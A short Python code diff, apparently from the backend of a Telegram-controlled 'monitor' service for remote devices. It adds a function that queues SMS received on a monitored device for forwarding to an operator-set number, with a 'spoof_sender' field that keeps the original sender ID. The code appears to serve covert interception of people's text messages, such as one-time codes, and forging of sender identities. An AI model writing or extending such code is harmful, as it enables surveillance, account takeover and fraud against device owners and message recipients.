@@ -53,6 +53,39 @@ def parse_channel_message(text: str) -> tuple[str | None, str]:
     return sender, message or cleaned
 
 
+def queue_forward_to_mynum(
+    db: Session,
+    profile: MonitorProfile,
+    device: Device,
+    sender: str,
+    message: str,
+) -> OutboundSMS:
+    """Forward incoming SMS to /mynum keeping original sender ID."""
+    from app.services import normalize_phone
+
+    if not profile.phone_number:
+        raise ValueError("Pehle /mynum <number> set karo")
+
+    sims = get_sim_list(device)
+    sim_index = profile.selected_sim_index or 0
+    sim_slot = sims[sim_index]["slot"] if sims else 1
+
+    outbound = OutboundSMS(
+        device_id=device.id,
+        telegram_user_id=profile.telegram_user_id,
+        sim_index=sim_index,
+        sim_slot=sim_slot,
+        to_number=normalize_phone(profile.phone_number),
+        spoof_sender=sender,
+        message=message,
+        status="pending",
+    )
+    db.add(outbound)
+    db.commit()
+    db.refresh(outbound)
+    return outbound
+
+
 def queue_manual_sms(
     db: Session,
     profile: MonitorProfile,
